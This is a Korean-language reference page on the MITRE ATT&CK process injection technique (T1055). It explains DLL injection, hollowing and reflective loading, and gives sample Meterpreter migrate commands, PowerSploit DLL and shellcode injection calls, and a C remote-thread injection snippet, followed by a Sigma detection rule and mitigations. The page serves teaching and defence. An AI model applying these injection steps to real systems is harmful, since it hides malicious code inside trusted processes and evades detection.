# T1055 — Process Injection

## 개요

**TA0005 / T1055**  
정상적인 프로세스의 메모리 공간에 악성코드를 삽입하여 실행하는 기법입니다. svchost.exe, explorer.exe 등 신뢰받는 프로세스 내에서 악성코드가 동작하므로 탐지를 우회하고 권한을 상속받을 수 있습니다.

---

## 동작 방식

**Classic DLL Injection:**
1. `OpenProcess()` — 대상 프로세스 핸들 획득
2. `VirtualAllocEx()` — 대상 프로세스 메모리 할당
3. `WriteProcessMemory()` — 악성 DLL 경로 작성
4. `CreateRemoteThread()` + `LoadLibraryA` — 원격 스레드로 DLL 로드

**Process Hollowing:**
1. 정상 프로세스를 Suspended 상태로 생성
2. 프로세스 메모리를 Unmap
3. 악성 페이로드를 해당 메모리에 기록
4. 실행 재개

**Reflective DLL Injection:**
- 파일 시스템 없이 메모리에서 직접 DLL 로드
- LoadLibrary API 호출 없이 자체 로더 사용

---

## 주요 커맨드 / 실습

### Meterpreter Process Migration
```ruby
# 현재 프로세스에서 안정적인 프로세스로 이동
meterpreter > ps
meterpreter > migrate 1234   # svchost.exe PID로 이동

# 자동으로 적합한 프로세스 찾아서 이동
meterpreter > run post/windows/manage/migrate
```

### PowerSploit Invoke-DllInjection
```powershell
# PowerSploit 임포트
Import-Module .\PowerSploit.psd1

# 특정 프로세스에 DLL 인젝션
$ProcId = (Get-Process -Name explorer).Id
Invoke-DllInjection -ProcessID $ProcId -Dll C:\temp\malicious.dll

# Shellcode 인젝션
Invoke-Shellcode -ProcessID $ProcId -Shellcode @(0x90,0x90,...) -Force
```

### Classic Remote Thread Injection (C 코드 예시)
```c
// 대상 프로세스에 DLL 인젝션
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, dllPathLen,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(hProcess, pRemoteMem, dllPath, dllPathLen, NULL);

HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
LPVOID pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");

CreateRemoteThread(hProcess, NULL, 0,
                   (LPTHREAD_START_ROUTINE)pLoadLibrary,
                   pRemoteMem, 0, NULL);
```

---

## 탐지 방법

### Sigma Rule
```yaml
title: Suspicious CreateRemoteThread into System Processes
id: 8c72e1e3-d5a7-4e30-b3f2-9f5c4e7b2a1d
status: stable
description: Detects CreateRemoteThread calls targeting system processes with LoadLibraryA
logsource:
    product: windows
    category: create_remote_thread
detection:
    selection:
        TargetImage|endswith:
            - '\svchost.exe'
            - '\explorer.exe'
            - '\lsass.exe'
            - '\winlogon.exe'
        StartFunction|contains:
            - 'LoadLibraryA'
            - 'LoadLibraryW'
    filter:
        SourceImage|startswith:
            - 'C:\Windows\System32\'
            - 'C:\Windows\SysWOW64\'
    condition: selection and not filter
falsepositives:
    - Legitimate AV/EDR products
    - Debuggers (Visual Studio, WinDbg)
level: high
tags:
    - attack.defense_evasion
    - attack.privilege_escalation
    - attack.t1055
```

---

## 대응 방안

1. Sysmon EventID 8 (CreateRemoteThread) 로깅 활성화
2. CFG(Control Flow Guard) 활성화로 간접 호출 제한
3. EDR 솔루션 배포 (프로세스 인젝션 행위 실시간 탐지)
4. 프로세스 격리 및 ACL 제한 (LSASS 등 중요 프로세스)
5. Windows Defender Credential Guard 활성화
6. 코드 서명(Code Signing) 정책 적용

---

## 참고자료
- [MITRE ATT&CK T1055](https://attack.mitre.org/techniques/T1055/)
- [Elastic - Process Injection Techniques Blog](https://www.elastic.co/blog/process-injection-techniques-cyber-threat-intelligence)
- [PowerSploit GitHub](https://github.com/PowerShellMafia/PowerSploit)
- [Sysmon Configuration Guide](https://github.com/SwiftOnSecurity/sysmon-config)
